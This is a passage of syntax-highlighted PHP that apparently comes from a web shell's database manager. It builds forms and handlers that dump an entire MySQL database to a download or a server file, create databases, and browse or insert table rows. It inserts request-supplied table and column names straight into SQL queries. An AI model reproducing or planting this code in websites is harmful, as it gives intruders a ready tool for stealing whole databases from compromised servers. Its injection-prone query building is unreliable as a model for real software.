<span class="x">            &amp;lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;dump_file&quot; size=&quot;30&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">&quot;dump_&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nv">$sql_db</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d-m-Y-H-i-s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.sql&quot;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;submit&quot; name=\&quot;submit\&quot; value=&quot;Dump&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span>
<span class="x">            </span><span class="cp">&lt;?php</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;newtbl&quot;</span><span class="p">)</span> <span class="p">{</span>
              <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="p">;</span>
              <span class="k">if</span> <span class="p">((</span><span class="nb">mysql_create_db</span> <span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">))</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)))</span> <span class="p">{</span>
                <span class="k">echo</span> <span class="s2">&quot;DB </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> has been created with success!&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
              <span class="p">}</span>
              <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t create DB </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">.&amp;lt;br&amp;gt;Reason:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nx">mysql_smarterror</span><span class="p">();}</span>
            <span class="p">}</span>
            <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;dump&quot;</span><span class="p">)</span> <span class="p">{</span>
              <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$diplay</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">GET</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">sql</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">dump</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_db</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_login</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_passwd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_server</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_port</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;SQL-Dump:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;DB:&amp;lt;/b&amp;gt; &amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_db</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
                <span class="nv">$v</span> <span class="o">=</span> <span class="nb">join</span> <span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">,</span><span class="nv">$dmptbls</span><span class="p">);</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Only tables (explode </span><span class="se">\&quot;</span><span class="s2">;</span><span class="se">\&quot;</span><span class="s2">)&amp;nbsp;&amp;lt;b&amp;gt;&amp;lt;sup&amp;gt;1&amp;lt;/sup&amp;gt;&amp;lt;/b&amp;gt;:&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">dmptbls</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">+</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$dump_file</span><span class="p">)</span> <span class="p">{</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$dump_file</span><span class="p">;}</span>
                <span class="k">else</span> <span class="p">{</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="s2">&quot;./dump_&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nv">$sql_db</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d-m-Y-H-i-s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.sql&quot;</span><span class="p">);}</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;File:&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_dump_file</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$tmp</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span><span class="o">+</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span> <span class="o">%</span> <span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Download: &amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_dump_download</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> checked&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Save to file: &amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_dump_savetofile</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> checked&amp;gt;&quot;</span><span class="p">;</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Dump</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;&amp;lt;sup&amp;gt;1&amp;lt;/sup&amp;gt;&amp;lt;/b&amp;gt; - all, if empty&quot;</span><span class="p">;</span>
                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
              <span class="p">}</span>
              <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$diplay</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
                <span class="nv">$set</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
                <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;sock&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sql_sock</span><span class="p">;</span>
                <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;db&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sql_db</span><span class="p">;</span>
                <span class="nv">$dump_out</span> <span class="o">=</span> <span class="s2">&quot;download&quot;</span><span class="p">;</span>
                <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;print&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;nl2br&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$dump_file</span><span class="p">;</span>
                <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;add_drop&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
                <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;onlytabs&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$dmptbls</span><span class="p">))</span> <span class="p">{</span><span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;onlytabs&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">,</span><span class="nv">$dmptbls</span><span class="p">);}</span>
                <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">mysql_dump</span><span class="p">(</span><span class="nv">$set</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_dump_download</span><span class="p">)</span> <span class="p">{</span>
                  <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
                  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: application/octet-stream&quot;</span><span class="p">);</span>
                  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-length: &quot;</span><span class="o">.</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
                  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
                  <span class="k">echo</span> <span class="nv">$ret</span><span class="p">;</span>
                  <span class="k">exit</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_dump_savetofile</span><span class="p">)</span> <span class="p">{</span>
                  <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
                  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Dump error! Can&#39;t write to </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">!&quot;</span><span class="p">;}</span>
                  <span class="k">else</span> <span class="p">{</span>
                    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
                    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
                    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Dumped! Dump has been writed to </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> (&quot;</span><span class="o">.</span><span class="nx">view_size</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;)&amp;lt;/b&amp;gt;.&quot;</span><span class="p">;</span>
                  <span class="p">}</span>
                <span class="p">}</span>
                <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Dump: nothing to do!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
              <span class="p">}</span>
            <span class="p">}</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$diplay</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">))</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_act</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_tbl_act</span> <span class="o">=</span> <span class="s2">&quot;browse&quot;</span><span class="p">;}</span>
          <span class="nv">$count</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT COUNT(*) FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;`;&quot;</span><span class="p">);</span>
          <span class="nv">$count_row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span>
          <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span>
          <span class="nv">$tbl_struct_result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW FIELDS FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;`;&quot;</span><span class="p">);</span>
          <span class="nv">$tbl_struct_fields</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
          <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$tbl_struct_result</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tbl_struct_fields</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_ls</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$sql_le</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_le</span> <span class="o">=</span> <span class="nv">$sql_ls</span> <span class="o">+</span> <span class="nv">$perpage</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_page</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_tbl_page</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_ls</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_tbl_ls</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_le</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_tbl_le</span> <span class="o">=</span> <span class="mi">30</span><span class="p">;}</span>
          <span class="nv">$perpage</span> <span class="o">=</span> <span class="nv">$sql_tbl_le</span> <span class="o">-</span> <span class="nv">$sql_tbl_ls</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$perpage</span><span class="p">))</span> <span class="p">{</span><span class="nv">$perpage</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;}</span>
          <span class="nv">$numpages</span> <span class="o">=</span> <span class="nv">$count_row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">/</span><span class="nv">$perpage</span><span class="p">;</span>
          <span class="nv">$e</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$sql_order</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$e</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$e</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$asc_desc</span> <span class="o">=</span> <span class="s2">&quot;DESC&quot;</span><span class="p">;}</span>
            <span class="k">else</span> <span class="p">{</span><span class="nv">$asc_desc</span> <span class="o">=</span> <span class="s2">&quot;ASC&quot;</span><span class="p">;}</span>
            <span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;ORDER BY `&quot;</span><span class="o">.</span><span class="nv">$e</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;` &quot;</span><span class="o">.</span><span class="nv">$asc_desc</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;}</span>
          <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` &quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;LIMIT &quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot; , &quot;</span><span class="o">.</span><span class="nv">$perpage</span><span class="o">.</span><span class="s2">&quot;&quot;</span><span class="p">;</span>
          <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="k">or</span> <span class="k">print</span><span class="p">(</span><span class="nx">mysql_smarterror</span><span class="p">());</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Table &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; cols and &quot;</span><span class="o">.</span><span class="nv">$count_row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; rows)&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_act=structure</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[&amp;lt;b&amp;gt; Structure &amp;lt;/b&amp;gt;]&amp;lt;/a&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_act=browse</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[&amp;lt;b&amp;gt; Browse &amp;lt;/b&amp;gt;]&amp;lt;/a&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_act=tbldump&amp;thistbl=1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[&amp;lt;b&amp;gt; Dump &amp;lt;/b&amp;gt;]&amp;lt;/a&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_act=insert</span><span class="se">\&quot;</span><span class="s2">&amp;gt;[&amp;nbsp;&amp;lt;b&amp;gt;Insert&amp;lt;/b&amp;gt;&amp;nbsp;]&amp;lt;/a&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&quot;</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_tbl_act</span> <span class="o">==</span> <span class="s2">&quot;structure&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;Coming sooon!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_tbl_act</span> <span class="o">==</span> <span class="s2">&quot;insert&quot;</span><span class="p">)</span> <span class="p">{</span>
